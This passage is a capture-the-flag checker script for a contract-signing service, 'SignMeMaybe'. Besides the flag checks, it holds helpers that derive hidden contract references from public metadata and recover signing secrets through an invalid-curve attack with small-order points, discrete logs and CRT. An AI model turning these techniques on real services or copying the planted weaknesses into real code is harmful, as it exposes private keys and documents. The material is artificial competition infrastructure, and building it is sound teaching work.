import asyncio
import hashlib
import json
import os
import random
import re
import string
from logging import LoggerAdapter
from typing import Any, Optional
from urllib import error, parse, request

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 1984
HTTP_TIMEOUT_SECONDS = float(os.getenv("SIGNMEMAYBE_CHECKER_TIMEOUT", "5"))
EXPECTED_FLAG_FORMAT = r"ENO[A-Za-z0-9+/=]{48}"
EXPECTED_FLAG_RE = re.compile(rf"^{EXPECTED_FLAG_FORMAT}$")

checker = Enochecker("SignMeMaybe", SERVICE_PORT)
app = lambda: checker.app

SIGNING_CURVE_NAME = "P-256"
SIGNING_P = 0x10001
SIGNING_A = 0x02
SIGNING_SCALAR_BYTES = 6
SIGNING_SCALAR_LIMIT = 1 << (SIGNING_SCALAR_BYTES * 8)
SIGNING_ATTACK_POINTS = [
    (251, 0x9b70, 0xdbda),
    (257, 0x562d, 0x7727),
    (263, 0x63f0, 0xfaba),
    (269, 0x2c81, 0x692a),
    (271, 0xfc9d, 0xc783),
    (277, 0x71, 0xfe95),
]


"""
Utility functions
"""

JsonObject = dict[str, Any]

NAME_PARTS = [
    "arden",
    "briar",
    "cai",
    "darin",
    "ellis",
    "finn",
    "gale",
    "halen",
    "ivan",
    "jules",
    "kieran",
    "linden",
    "marin",
    "nolan",
    "orren",
    "pavel",
    "quinn",
    "rowan",
    "soren",
    "talin",
    "vanya",
    "wren",
]

HANDLE_PARTS = [
    "archive",
    "atlas",
    "bridge",
    "civic",
    "docket",
    "field",
    "ledger",
    "matrix",
    "morrow",
    "notary",
    "parcel",
    "record",
    "signal",
    "vector",
    "vault",
]


def random_suffix(length: int = 16) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def random_username() -> str:
    return f"{random.choice(NAME_PARTS)}_{random.choice(HANDLE_PARTS)}_{random.randint(10000, 99999)}"


def random_password() -> str:
    return "pass-" + random_suffix(24)


def log_unexpected_flag_format(flag: Any, logger: LoggerAdapter) -> None:
    if not isinstance(flag, str) or EXPECTED_FLAG_RE.fullmatch(flag) is None:
        logger.debug("Provided task flag does not match expected format %s", EXPECTED_FLAG_FORMAT)


def service_base_url(task: Any) -> str:
    address = getattr(task, "address", None) or getattr(task, "host", None)
    if not isinstance(address, str) or not address:
        raise MumbleException("Checker task did not contain a target address")
    return f"http://{address}:{SERVICE_PORT}"


def require_json_object(value: Any, context: str) -> JsonObject:
    if not isinstance(value, dict):
        raise MumbleException(f"{context} did not return a JSON object")
    return value


class HttpClient:
    def __init__(self, base_url: str, logger: LoggerAdapter):
        self.base_url = base_url.rstrip("/")
        self.logger = logger

    async def request_json(
        self,
        method: str,
        path: str,
        body: JsonObject | None = None,
        token: str | None = None,
    ) -> tuple[int, Any]:
        return await asyncio.to_thread(self._request_json_sync, method, path, body, token)

    def _request_json_sync(
        self,
        method: str,
        path: str,
        body: JsonObject | None,
        token: str | None,
    ) -> tuple[int, Any]:
        url = self.base_url + path
        data: bytes | None = None
        headers: dict[str, str] = {"Accept": "application/json"}

        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"

        if token is not None:
            headers["X-Session-Token"] = token

        req = request.Request(url, data=data, headers=headers, method=method)
        self.logger.debug("Sending %s %s", method, path)

        try:
            with request.urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
                return resp.status, self._decode_response(resp.read())
        except error.HTTPError as exc:
            return exc.code, self._decode_response(exc.read())
        except (error.URLError, TimeoutError, ConnectionError, OSError) as exc:
            self.logger.debug("Connection to service failed: %r", exc)
            raise OfflineException("Could not connect to service") from exc

    async def request_bytes(
        self,
        method: str,
        path: str,
        token: str | None = None,
    ) -> tuple[int, bytes, dict[str, str]]:
        return await asyncio.to_thread(self._request_bytes_sync, method, path, token)

    def _request_bytes_sync(
        self,
        method: str,
        path: str,
        token: str | None,
    ) -> tuple[int, bytes, dict[str, str]]:
        url = self.base_url + path
        headers: dict[str, str] = {"Accept": "application/pdf, application/octet-stream"}

        if token is not None:
            headers["X-Session-Token"] = token

        req = request.Request(url, headers=headers, method=method)
        self.logger.debug("Sending %s %s", method, path)

        try:
            with request.urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
                response_headers = {key.lower(): value for key, value in resp.headers.items()}
                return resp.status, resp.read(), response_headers
        except error.HTTPError as exc:
            response_headers = {key.lower(): value for key, value in exc.headers.items()}
            return exc.code, exc.read(), response_headers
        except (error.URLError, TimeoutError, ConnectionError, OSError) as exc:
            self.logger.debug("Connection to service failed: %r", exc)
            raise OfflineException("Could not connect to service") from exc

    @staticmethod
    def _decode_response(raw: bytes) -> Any:
        if not raw:
            return None

        text = raw.decode("utf-8", errors="replace")
        try:
            return json.loads(text)
        except json.JSONDecodeError as exc:
            raise MumbleException("Service returned invalid JSON") from exc

    async def register_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/register",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to register user: HTTP {status}")

        data_obj = require_json_object(data, "register response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Register response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Register response did not contain a valid token")

        return user_id, username, token

    async def login_user(self, username: str, password: str) -> tuple[int, str, str]:
        status, data = await self.request_json(
            "POST",
            "/api/login",
            {
                "username": username,
                "password": password,
            },
        )

        if status != 200:
            raise MumbleException(f"Failed to login user: HTTP {status}")

        data_obj = require_json_object(data, "login response")
        user_id = data_obj.get("userId")
        token = data_obj.get("token")

        if not isinstance(user_id, int) or user_id <= 0:
            raise MumbleException("Login response did not contain a valid userId")
        if not isinstance(token, str) or not token:
            raise MumbleException("Login response did not contain a valid token")

        return user_id, username, token

    async def current_user(self, token: str) -> tuple[int, Any]:
        return await self.request_json("GET", "/api/me", token=token)

    async def create_contract(
        self,
        token: str,
        title: str,
        content: str,
        notary_secret: str | None = None,
    ) -> JsonObject:
        body: JsonObject = {
            "title": title,
            "content": content,
        }
        if notary_secret is not None:
            body["notarySecret"] = notary_secret

        status, data = await self.request_json(
            "POST",
            "/api/contracts",
            body,
            token=token,
        )

        if status not in (200, 201):
            raise MumbleException(f"Failed to create contract: HTTP {status}")

        data_obj = require_json_object(data, "contract creation response")
        reference = data_obj.get("reference")

        if not isinstance(reference, str) or not reference.startswith("CNTR-"):
            response_keys = ", ".join(sorted(data_obj.keys())) or "<none>"
            raise MumbleException(
                "Contract creation response had an unexpected record identifier. "
                f"Response keys: {response_keys}"
            )

        return data_obj

    async def list_contracts(self, token: str) -> list[JsonObject]:
        status, data = await self.request_json("GET", "/api/contracts", token=token)

        if status != 200:
            raise MumbleException(f"Failed to list contracts: HTTP {status}")

        data_obj = require_json_object(data, "contract list response")
        contracts = data_obj.get("contracts")

        if not isinstance(contracts, list):
            raise MumbleException("Contract list response did not contain a contracts list")

        return [contract for contract in contracts if isinstance(contract, dict)]

    async def public_contracts_by_username(self, username: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/users/{username}/contracts",
        )

    async def latest_contract_version(self, token: str, reference: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/contracts/{reference}/versions/latest",
            token=token,
        )

    async def latest_contract_pdf(self, token: str, reference: str) -> tuple[int, bytes, dict[str, str]]:
        return await self.request_bytes(
            "GET",
            f"/api/contracts/{reference}/versions/latest/pdf",
            token=token,
        )

    async def sealed_record(self, token: str, reference: str) -> tuple[int, bytes, dict[str, str]]:
        return await self.request_bytes(
            "GET",
            f"/api/contracts/{reference}/notary/sealed",
            token=token,
        )

    async def create_signing_authority(
        self,
        token: str,
        display_name: str,
        signing_secret: str | None = None,
        curve_name: str = SIGNING_CURVE_NAME,
    ) -> JsonObject:
        body: JsonObject = {
            "displayName": display_name,
            "curveName": curve_name,
        }
        if signing_secret is not None:
            body["signingSecret"] = signing_secret

        status, data = await self.request_json(
            "POST",
            "/api/signing/authorities",
            body,
            token=token,
        )
        if status not in (200, 201):
            raise MumbleException(f"Failed to create signing authority: HTTP {status}")

        data_obj = require_json_object(data, "signing authority creation response")
        authority_id = data_obj.get("authorityId")
        if not isinstance(authority_id, str) or not authority_id.startswith("SIG-"):
            raise MumbleException("Signing authority response did not contain a valid authorityId")

        return data_obj

    async def list_signing_authorities(self, token: str) -> list[JsonObject]:
        status, data = await self.request_json("GET", "/api/signing/authorities", token=token)
        if status != 200:
            raise MumbleException(f"Failed to list signing authorities: HTTP {status}")

        data_obj = require_json_object(data, "signing authority list response")
        authorities = data_obj.get("authorities")
        if not isinstance(authorities, list):
            raise MumbleException("Signing authority list response did not contain an authorities list")

        return [authority for authority in authorities if isinstance(authority, dict)]

    async def public_signing_authorities_by_username(self, username: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/users/{username}/signing-authorities",
        )

    async def signing_secret(self, token: str, authority_id: str) -> tuple[int, Any]:
        return await self.request_json(
            "GET",
            f"/api/signing/authorities/{authority_id}/secret",
            token=token,
        )

    async def create_signature_ceremony(
        self,
        token: str,
        authority_id: str,
        message: str,
        base_point: tuple[int, int] | None = None,
        curve_name: str = SIGNING_CURVE_NAME,
    ) -> tuple[int, Any]:
        body: JsonObject = {
            "message": message,
            "curveName": curve_name,
        }
        if base_point is not None:
            body["basePoint"] = {
                "x": hex(base_point[0]),
                "y": hex(base_point[1]),
            }

        return await self.request_json(
            "POST",
            f"/api/signing/authorities/{authority_id}/ceremonies",
            body,
            token=token,
        )

    async def validate_signature_ceremony(self, token: str, ceremony_id: str) -> tuple[int, Any]:
        return await self.request_json(
            "POST",
            f"/api/signing/ceremonies/{ceremony_id}/validate",
            token=token,
        )


def make_client(task: Any, logger: LoggerAdapter) -> HttpClient:
    return HttpClient(service_base_url(task), logger)


def get_string_field(data: JsonObject, key: str, context: str) -> str:
    value = data.get(key)
    if not isinstance(value, str):
        raise MumbleException(f"{context} did not contain a valid {key}")
    return value


def is_pdf_literal_ascii(value: str) -> bool:
    return all(ord(character) < 128 for character in value)


def normalize_checksum(value: Any) -> str | None:
    if not isinstance(value, str):
        return None

    checksum = value.strip().lower()
    if re.fullmatch(r"[0-9a-f]{64}", checksum) is None:
        return None

    return checksum


def reference_from_public_metadata(username: str, title: str, checksum: str) -> str:
    normalized_title = title.strip()
    normalized_checksum = checksum.strip().lower()
    material = f"{username}:{normalized_title}:{normalized_checksum}".encode("utf-8")
    return "CNTR-" + hashlib.sha256(material).hexdigest()[:24]


def reference_from_public_contract(username: str, contract: JsonObject) -> str | None:
    title = contract.get("title")
    checksum = public_contract_checksum(contract)
    if not isinstance(title, str) or checksum is None:
        return None

    return reference_from_public_metadata(username, title, checksum)


def public_contract_checksum(contract: JsonObject) -> str | None:
    latest_version = contract.get("latestVersion")
    if not isinstance(latest_version, dict):
        return None

    return normalize_checksum(latest_version.get("checksum"))


EcPoint = tuple[int, int] | None


def ec_inverse(value: int) -> int:
    return pow(value % SIGNING_P, -1, SIGNING_P)


def ec_add(left: EcPoint, right: EcPoint) -> EcPoint:
    if left is None:
        return right
    if right is None:
        return left

    x1, y1 = left
    x2, y2 = right
    if x1 == x2 and (y1 + y2) % SIGNING_P == 0:
        return None

    if left == right:
        if y1 % SIGNING_P == 0:
            return None
        slope = ((3 * x1 * x1 + SIGNING_A) * ec_inverse(2 * y1)) % SIGNING_P
    else:
        slope = ((y2 - y1) * ec_inverse(x2 - x1)) % SIGNING_P

    x3 = (slope * slope - x1 - x2) % SIGNING_P
    y3 = (slope * (x1 - x3) - y1) % SIGNING_P
    return x3, y3


def ec_multiply(scalar: int, point: EcPoint) -> EcPoint:
    result: EcPoint = None
    addend = point
    while scalar > 0:
        if scalar & 1:
            result = ec_add(result, addend)
        addend = ec_add(addend, addend)
        scalar >>= 1
    return result


def parse_service_point(value: Any) -> EcPoint:
    if not isinstance(value, dict):
        raise MumbleException("Signature ceremony response did not contain a point object")
    if value.get("infinity") is True:
        return None

    x = value.get("x")
    y = value.get("y")
    if not isinstance(x, str) or not isinstance(y, str):
        raise MumbleException("Signature ceremony response point was incomplete")

    return int(x, 16), int(y, 16)


def discrete_log_small_order(base_point: EcPoint, target: EcPoint, order: int) -> int:
    current: EcPoint = None
    for scalar in range(order):
        if current == target:
            return scalar
        current = ec_add(current, base_point)

    raise MumbleException("Could not resolve signature ceremony response")


def crt_pair(left_value: int, left_modulus: int, right_value: int, right_modulus: int) -> tuple[int, int]:
    factor = ((right_value - left_value) * pow(left_modulus, -1, right_modulus)) % right_modulus
    modulus = left_modulus * right_modulus
    return (left_value + left_modulus * factor) % modulus, modulus


def crt(residues: list[tuple[int, int]]) -> int:
    value, modulus = residues[0]
    for residue, next_modulus in residues[1:]:
        value, modulus = crt_pair(value, modulus, residue, next_modulus)
    return value


def decrypt_signing_secret(authority_id: str, scalar: int, secret_blob: str) -> bytes:
    parts = secret_blob.split(":")
    if len(parts) != 3 or parts[0] != "v1":
        raise MumbleException("Public signing metadata had an unsupported format")

    nonce_hex = parts[1]
    ciphertext = bytes.fromhex(parts[2])
    scalar_hex = scalar.to_bytes(SIGNING_SCALAR_BYTES, "big").hex()
    output = bytearray()
    counter = 0
    while len(output) < len(ciphertext):
        material = f"SignMeMaybe signing secret:{authority_id}:{scalar_hex}:{nonce_hex}:{counter}".encode("utf-8")
        output.extend(hashlib.sha256(material).digest())
        counter += 1

    return bytes(cipher ^ stream for cipher, stream in zip(ciphertext, output))


def extract_usernames_from_hints(task: ExploitCheckerTaskMessage) -> list[str]:
    possible_hints = [
        getattr(task, "attack_info", None),
        getattr(task, "flag_ids", None),
        getattr(task, "flag_id", None),
    ]

    found: list[str] = []
    for hint in possible_hints:
        found.extend(_extract_usernames(hint))

    seen: set[str] = set()
    unique_usernames: list[str] = []
    for username in found:
        if username not in seen:
            seen.add(username)
            unique_usernames.append(username)

    return unique_usernames


def _extract_usernames(value: Any) -> list[str]:
    if value is None:
        return []

    if isinstance(value, str):
        value = value.strip()
        if not value:
            return []

        try:
            decoded = json.loads(value)
        except json.JSONDecodeError:
            decoded = None

        if decoded is not None:
            return _extract_usernames(decoded)

        if 3 <= len(value) <= 40 and all(c.isalnum() or c in "_-" for c in value):
            return [value]

        return []

    if isinstance(value, dict):
        result: list[str] = []
        for key in ("username", "ownerUsername", "attackInfo", "attack_info", "flagId", "flag_id", "hint"):
            if key in value:
                result.extend(_extract_usernames(value[key]))
        if not result:
            for nested in value.values():
                result.extend(_extract_usernames(nested))
        return result

    if isinstance(value, (list, tuple, set)):
        result: list[str] = []
        for nested in value:
            result.extend(_extract_usernames(nested))
        return result

    return []


"""
CHECKER FUNCTIONS
"""


@checker.putflag(0)
async def putflag_idor_contract(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    title = "Filed Settlement Addendum " + random_suffix(12)
    content = (
        "Public settlement addendum\n"
        f"Case marker: {random_suffix(18)}\n"
        f"Escrow disclosure: {task.flag}\n"
        "This record is approved for certified PDF archiving."
    )

    logger.debug("Registering flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating IDOR flag contract")
    created = await client.create_contract(token, title, content)
    reference = get_string_field(created, "reference", "contract creation response")
    checksum = get_string_field(created, "checksum", "contract creation response")
    derived_reference = reference_from_public_metadata(username, title, checksum)
    if derived_reference != reference:
        raise MumbleException("Contract creation metadata validation failed")

    logger.debug("Creating IDOR decoy contracts")
    decoy_references: list[str] = []
    for _index in range(3):
        decoy_title = "Filed Settlement Addendum " + random_suffix(12)
        decoy_content = (
            "Public settlement addendum\n"
            f"Case marker: {random_suffix(18)}\n"
            f"Escrow disclosure: review-{random_suffix(24)}\n"
            "This record is approved for certified PDF archiving."
        )
        decoy_created = await client.create_contract(token, decoy_title, decoy_content)
        decoy_references.append(get_string_field(decoy_created, "reference", "contract creation response"))

    logger.debug("Checking that the new contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created contract was not visible in the owner's list")
    for decoy_reference in decoy_references:
        assert_in(decoy_reference, listed_references, "Created decoy contract was not visible in the owner's list")

    await db.set(
        "idor_contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
            "checksum": checksum,
        },
    )

    return username


@checker.getflag(0)
async def getflag_idor_contract(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("idor_contract")
        username = stored["username"]
        password = stored["password"]
        title = stored["title"]
        reference = stored["reference"]
        content = stored["content"]
        checksum = stored["checksum"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the flag owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving own latest contract version")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored contract: HTTP {status}")

    data_obj = require_json_object(data, "latest contract response")
    latest_content = get_string_field(data_obj, "content", "latest contract response")
    if latest_content != content:
        raise MumbleException("Stored flag contract content was incorrect")
    if task.flag not in latest_content:
        raise MumbleException("Stored flag content was missing")
    assert_equals(data_obj.get("checksum"), checksum, "Stored flag checksum was incorrect")

    logger.debug("Retrieving own latest contract PDF")
    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve stored contract PDF: HTTP {status}")
    content_type = headers.get("content-type", "").lower()
    if "application/pdf" not in content_type:
        raise MumbleException("Stored contract PDF had the wrong content type")
    if is_pdf_literal_ascii(task.flag) and task.flag.encode("utf-8") not in pdf_bytes:
        raise MumbleException("Stored flag content was missing from the PDF")

    logger.debug("Checking public metadata for indirect reference leakage")
    status, public_data = await client.public_contracts_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public flag metadata: HTTP {status}")
    public_obj = require_json_object(public_data, "public flag metadata response")
    assert_equals(public_obj.get("username"), username, "Public flag metadata username was incorrect")
    public_contracts = public_obj.get("contracts")
    if not isinstance(public_contracts, list):
        raise MumbleException("Public flag metadata did not contain a contracts list")

    public_contract_objects: list[JsonObject] = []
    matching_public_contracts: list[JsonObject] = []
    for contract in public_contracts:
        if not isinstance(contract, dict):
            continue
        if "reference" in contract:
            raise MumbleException("Public metadata contained an unexpected record field")
        public_contract_objects.append(contract)
        if contract.get("title") == title and public_contract_checksum(contract) == checksum:
            matching_public_contracts.append(contract)

    if len(public_contract_objects) < 4:
        raise MumbleException("Contract metadata entries were missing from public metadata")
    if not matching_public_contracts:
        raise MumbleException("Contract metadata entry was not visible in public metadata")
    assert_equals(
        reference_from_public_contract(username, matching_public_contracts[0]),
        reference,
        "Contract metadata validation failed",
    )


@checker.putflag(1)
async def putflag_notary_contract(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    title = "Certified Supplier Agreement " + random_suffix(12)
    content = "This contract package is sealed by the SignMeMaybe notary service."

    logger.debug("Registering notary flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating contract package with a sealed record")
    created = await client.create_contract(token, title, content, notary_secret=task.flag)
    reference = get_string_field(created, "reference", "contract creation response")
    notary_stamp = get_string_field(created, "notaryStamp", "contract creation response")

    logger.debug("Checking that the new notary contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created notary contract was not visible in the owner's list")

    await db.set(
        "notary_contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
            "notaryStamp": notary_stamp,
        },
    )

    return username


@checker.getflag(1)
async def getflag_notary_contract(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("notary_contract")
        username = stored["username"]
        password = stored["password"]
        reference = stored["reference"]
        content = stored["content"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the notary flag owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving own sealed notary record")
    status, sealed_bytes, _headers = await client.sealed_record(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve private package: HTTP {status}")
    if sealed_bytes != task.flag.encode("utf-8"):
        raise MumbleException("Private package content was incorrect")

    logger.debug("Retrieving own latest notary contract version")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored notary contract: HTTP {status}")

    data_obj = require_json_object(data, "latest notary contract response")
    latest_content = get_string_field(data_obj, "content", "latest notary contract response")
    if latest_content != content:
        raise MumbleException("Stored public notary contract content was incorrect")
    if task.flag in json.dumps(data_obj, ensure_ascii=False):
        raise MumbleException("Private package data appeared in public metadata")

    logger.debug("Retrieving own latest notary contract PDF")
    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve stored notary contract PDF: HTTP {status}")
    content_type = headers.get("content-type", "").lower()
    if "application/pdf" not in content_type:
        raise MumbleException("Stored notary contract PDF had the wrong content type")
    if task.flag.encode("utf-8") in pdf_bytes:
        raise MumbleException("Private package data appeared in the public PDF")


@checker.putflag(2)
async def putflag_signing_authority(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> str:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    username = random_username()
    password = random_password()
    display_name = "Civic Signing Authority " + random_suffix(12)

    logger.debug("Registering signing flag owner")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Creating signing authority with private signing note")
    created = await client.create_signing_authority(token, display_name, signing_secret=task.flag)
    authority_id = get_string_field(created, "authorityId", "signing authority creation response")
    secret_blob = get_string_field(created, "secretBlob", "signing authority creation response")

    logger.debug("Checking that the signing authority is present in the owner's list")
    authorities = await client.list_signing_authorities(token)
    listed_authorities = [authority.get("authorityId") for authority in authorities]
    assert_in(authority_id, listed_authorities, "Created signing authority was not visible in the owner's list")

    await db.set(
        "signing_authority",
        {
            "username": username,
            "password": password,
            "displayName": display_name,
            "authorityId": authority_id,
            "secretBlob": secret_blob,
        },
    )

    return username


@checker.getflag(2)
async def getflag_signing_authority(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)
    log_unexpected_flag_format(task.flag, logger)

    try:
        stored = await db.get("signing_authority")
        username = stored["username"]
        password = stored["password"]
        authority_id = stored["authorityId"]
        secret_blob = stored["secretBlob"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putflag; the previous putflag likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the signing authority owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Retrieving owner-only signing secret")
    status, data = await client.signing_secret(token, authority_id)
    if status != 200:
        raise MumbleException(f"Could not retrieve signing note: HTTP {status}")
    data_obj = require_json_object(data, "signing secret response")
    assert_equals(data_obj.get("secret"), task.flag, "Signing note content was incorrect")

    logger.debug("Checking public signing metadata")
    status, public_data = await client.public_signing_authorities_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public signing metadata: HTTP {status}")
    public_obj = require_json_object(public_data, "public signing metadata response")
    public_authorities = public_obj.get("authorities")
    if not isinstance(public_authorities, list):
        raise MumbleException("Public signing metadata did not contain an authorities list")

    matching = [
        authority for authority in public_authorities
        if isinstance(authority, dict) and authority.get("authorityId") == authority_id
    ]
    if not matching:
        raise MumbleException("Signing authority was missing from public metadata")
    if task.flag in json.dumps(matching[0], ensure_ascii=False):
        raise MumbleException("Private signing note appeared in public metadata")
    assert_equals(matching[0].get("secretBlob"), secret_blob, "Public signing metadata was incorrect")

    logger.debug("Creating and validating normal server-side signature ceremony")
    status, ceremony_data = await client.create_signature_ceremony(
        token,
        authority_id,
        "archive approval " + random_suffix(16),
    )
    if status not in (200, 201):
        raise MumbleException(f"Could not create signature ceremony: HTTP {status}")
    ceremony_obj = require_json_object(ceremony_data, "signature ceremony response")
    ceremony_id = get_string_field(ceremony_obj, "ceremonyId", "signature ceremony response")

    status, validation_data = await client.validate_signature_ceremony(token, ceremony_id)
    if status != 200:
        raise MumbleException(f"Could not validate signature ceremony: HTTP {status}")
    validation_obj = require_json_object(validation_data, "signature validation response")
    if validation_obj.get("valid") is not True:
        raise MumbleException("Normal server-side signature ceremony did not validate")


@checker.putnoise(0)
async def putnoise_contract(
    task: PutnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()
    title = "Reference Contract " + random_suffix(12)
    content = "Noise contract body " + random_suffix(36)

    logger.debug("Registering noise user")
    _user_id, _username, token = await client.register_user(username, password)

    logger.debug("Checking current noise user session")
    status, data = await client.current_user(token)
    if status != 200:
        raise MumbleException(f"Could not retrieve current noise user: HTTP {status}")
    data_obj = require_json_object(data, "current noise user response")
    assert_equals(data_obj.get("username"), username, "Current noise user was incorrect")

    logger.debug("Creating noise contract")
    created = await client.create_contract(token, title, content)
    reference = get_string_field(created, "reference", "contract creation response")
    checksum = get_string_field(created, "checksum", "contract creation response")

    logger.debug("Checking that the noise contract is present in the owner's list")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Created noise contract was not visible in the owner's list")

    await db.set(
        "noise_contract",
        {
            "username": username,
            "password": password,
            "title": title,
            "content": content,
            "reference": reference,
            "checksum": checksum,
        },
    )


@checker.getnoise(0)
async def getnoise_contract(
    task: GetnoiseCheckerTaskMessage,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    client = make_client(task, logger)

    try:
        stored = await db.get("noise_contract")
        username = stored["username"]
        password = stored["password"]
        title = stored["title"]
        content = stored["content"]
        reference = stored["reference"]
        checksum = stored["checksum"]
    except (KeyError, TypeError) as exc:
        raise MumbleException(
            "Missing or broken database entry from putnoise; the previous putnoise likely failed "
            "before storing checker state"
        ) from exc

    logger.debug("Logging in as the noise owner")
    _user_id, _username, token = await client.login_user(username, password)

    logger.debug("Checking current noise user after login")
    status, data = await client.current_user(token)
    if status != 200:
        raise MumbleException(f"Could not retrieve logged-in noise user: HTTP {status}")
    data_obj = require_json_object(data, "logged-in noise user response")
    assert_equals(data_obj.get("username"), username, "Logged-in noise user was incorrect")

    logger.debug("Checking that the noise contract is still listed")
    contracts = await client.list_contracts(token)
    listed_references = [contract.get("reference") for contract in contracts]
    assert_in(reference, listed_references, "Noise contract was not visible in the owner's list")

    logger.debug("Checking public noise contract metadata")
    status, data = await client.public_contracts_by_username(username)
    if status != 200:
        raise MumbleException(f"Could not retrieve public noise metadata: HTTP {status}")
    data_obj = require_json_object(data, "public noise metadata response")
    assert_equals(data_obj.get("username"), username, "Public noise metadata username was incorrect")
    public_contracts = data_obj.get("contracts")
    if not isinstance(public_contracts, list):
        raise MumbleException("Public noise metadata did not contain a contracts list")
    public_checksums = []
    for contract in public_contracts:
        if not isinstance(contract, dict):
            continue
        if "reference" in contract:
            raise MumbleException("Public noise metadata contained an unexpected record field")
        public_checksums.append(public_contract_checksum(contract))
    assert_in(checksum, public_checksums, "Noise contract checksum was not visible in public metadata")

    logger.debug("Retrieving noise contract")
    status, data = await client.latest_contract_version(token, reference)

    if status != 200:
        raise MumbleException(f"Could not retrieve stored noise contract: HTTP {status}")

    data_obj = require_json_object(data, "latest noise contract response")
    assert_equals(data_obj.get("title"), title, "Stored noise contract title was incorrect")
    assert_equals(
        get_string_field(data_obj, "content", "latest noise contract response"),
        content,
        "Stored noise contract content was incorrect",
    )

    logger.debug("Retrieving noise contract PDF")
    status, pdf_bytes, headers = await client.latest_contract_pdf(token, reference)
    if status != 200:
        raise MumbleException(f"Could not retrieve stored noise contract PDF: HTTP {status}")
    content_type = headers.get("content-type", "").lower()
    if "application/pdf" not in content_type:
        raise MumbleException("Stored noise contract PDF had the wrong content type")
    if not pdf_bytes.startswith(b"%PDF-"):
        raise MumbleException("Stored noise contract PDF was not a valid PDF")


@checker.havoc(0)
async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    logger.debug("Checking health endpoint")
    status, data = await client.request_json("GET", "/health")

    if status != 200:
        raise MumbleException(f"Health endpoint returned HTTP {status}")

    data_obj = require_json_object(data, "health response")
    assert_equals(data_obj.get("status"), "ok", "Health endpoint did not report ok")


@checker.havoc(1)
async def havoc_rejections(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    client = make_client(task, logger)

    username = random_username()
    password = random_password()

    logger.debug("Checking that login rejects an unknown account")
    status, _data = await client.request_json(
        "POST",
        "/api/login",
        {
            "username": username,
            "password": password,
        },
    )
    if status != 401:
